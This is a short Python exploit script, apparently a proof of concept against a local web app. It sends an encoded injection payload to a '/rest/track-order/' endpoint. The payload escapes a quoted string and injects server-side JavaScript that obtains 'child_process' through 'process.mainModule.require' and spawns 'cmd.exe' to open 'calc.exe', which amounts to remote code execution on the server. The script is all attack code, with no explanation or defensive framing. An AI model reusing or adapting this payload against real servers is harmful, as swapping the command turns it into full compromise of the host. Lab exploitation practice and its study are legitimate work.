#!/usr/bin/python3
import sys
import requests
import logging
import urllib

HOST = 'http://192.168.93.1:3000'

command = """
var require = this.process.mainModule.require;
const { spawn } = require("child_process");

if (!globalThis.__calc_running__) {
  globalThis.__calc_running__ = true;

  const child = spawn("cmd.exe", ['/c', 'calc.exe'], {
    windowsHide: true,
    stdio: ["ignore", "ignore", "ignore"],
  });

  child.on("exit", () => {
    globalThis.__calc_running__ = false;
  });

  child.on("error", () => {
    globalThis.__calc_running__ = false;
  });
}
"""

payload = f"' || (function() {{ {command} }})(); //"

encoded = urllib.parse.quote(payload, safe='')
r = requests.get(HOST + "/rest/track-order/" + encoded)
